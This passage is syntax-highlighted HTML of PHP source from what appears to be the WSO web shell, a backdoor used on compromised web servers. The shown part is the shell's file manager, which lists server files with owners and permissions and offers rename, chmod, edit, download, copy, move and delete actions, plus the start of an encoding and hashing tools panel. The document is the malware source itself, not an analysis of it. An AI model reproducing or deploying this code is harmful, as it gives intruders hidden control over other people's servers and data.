class="s2">)&#39;&amp;gt;Modify&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Owner/Group&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_perms_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;Permissions&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Actions&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$dirs</span> <span class="o">=</span> <span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$n</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ow</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
        <span class="nv">$gr</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span>
                     <span class="s1">&#39;path&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span>
                     <span class="s1">&#39;modify&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])),</span>
                     <span class="s1">&#39;perms&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
                     <span class="s1">&#39;size&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
                     <span class="s1">&#39;owner&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
                     <span class="s1">&#39;group&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span>
                    <span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span>
            <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;file&#39;</span><span class="p">));</span>
        <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span>
            <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;link&#39;</span><span class="p">));</span>
        <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">))</span>
            <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;dir&#39;</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sort</span><span class="p">;</span>
    <span class="k">function</span> <span class="nf">wsoCmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;size&#39;</span><span class="p">)</span>
            <span class="k">return</span> <span class="nb">strcmp</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]),</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]))</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="k">return</span> <span class="p">((</span><span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nb">usort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
    <span class="nb">usort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
    <span class="nv">$files</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="nv">$files</span><span class="p">);</span>
    <span class="nv">$l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$l</span><span class="o">?</span><span class="s1">&#39; class=l1&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=checkbox name=&quot;f[]&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot; class=chkbx&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;view\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&amp;lt;b&amp;gt;[ &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; ]&amp;lt;/b&amp;gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="nx">wsoViewSize</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span><span class="o">:</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;modify&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;owner&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;group&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;chmod\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">]</span>
            <span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;rename\&#39;)&quot;&amp;gt;R&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;touch\&#39;)&quot;&amp;gt;T&amp;lt;/a&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;edit\&#39;)&quot;&amp;gt;E&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;download\&#39;)&quot;&amp;gt;D&amp;lt;/a&amp;gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
        <span class="nv">$l</span> <span class="o">=</span> <span class="nv">$l</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=7&amp;gt; </span>
<span class="s2">   &amp;lt;input type=hidden name=a value=&#39;FilesMan&#39;&amp;gt; </span>
<span class="s2">   &amp;lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; </span>
<span class="s2">   &amp;lt;input type=hidden name=charset value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; </span>
<span class="s2">   &amp;lt;select name=&#39;p1&#39;&amp;gt;&amp;lt;option value=&#39;copy&#39;&amp;gt;Copy&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;move&#39;&amp;gt;Move&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;delete&#39;&amp;gt;Delete&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;zip&#39;&amp;gt;Compress (zip)&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;unzip&#39;&amp;gt;Uncompress (zip)&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span><span class="o">&amp;&amp;@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;paste&#39;&amp;gt;Paste / zip&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionStringTools</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2bin&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2bin</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">decbin</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;binhex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">binhex</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">bindec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2ascii&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2ascii</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">strLen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">2</span><span class="p">){</span><span class="nv">$r</span><span class="o">.=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">]));}</span><span class="k">return</span> <span class="nv">$r</span><span class="p">;}}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;ascii2hex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">ascii2hex</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;full_urlencode&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">full_urlencode</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span>

    <span class="nv">$stringTools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>

        <span class="s1">&#39;Base64 encode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;base64_encode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Base64 decode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;base64_decode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Url encode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;urlencode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Url decode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;urldecode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Full urlencode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;full_urlencode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;md5 hash&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;md5&#39;</span><span class="p">,</span>
        <span class="s1">&#39;sha1 hash&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span>
        <span class="s1">&#39;crypt&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;crypt&#39;</span><span class="p">,</span>
        <span class="s1">&#39;CRC32&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;crc32&#39;</span><span class="p">,</span>
        <span class="s1">&#39;ASCII to HEX&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;ascii2hex&#39;</span><span class="p">,</span>
        <span class="s1">&#39;HEX to ASCII&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;hex2ascii&#39;</span><span class="p">,</span>
        <span class="s1">&#39;HEX to DEC&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span>
        <span class="s1">&#39;HEX to BIN&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;hex2bin&#39;</span><span class="p">,</span>
        <span class="s1">&#39;DEC to HEX&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span>
        <span class="s1">&#39;DEC to BIN&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span>
        <span class="s1">&#39;BIN to HEX&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;binhex&#39;</span><span class="p">,</span>
        <span class="s1">&#39;BIN to DEC&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span>
        <span class="s1">&#39;String to lower case&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;strtolower&#39;</span><span class="p">,</span>
        <span class="s1">&#39;String to upper case&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;strtoupper&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Htmlspecialchars&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;htmlspecialchars&#39;</span><span class="p">,</span>
        <span class="s1">&#39;String length&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;strlen&#39;</span><span class="p">,</span>
    <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$stringTools</span><span class="p">))</span>
            <span class="k">echo</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;strOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;strOutput&#39;).innerHTML=&#39;&quot;</span><span class="o">.</span><span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;String conversions&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
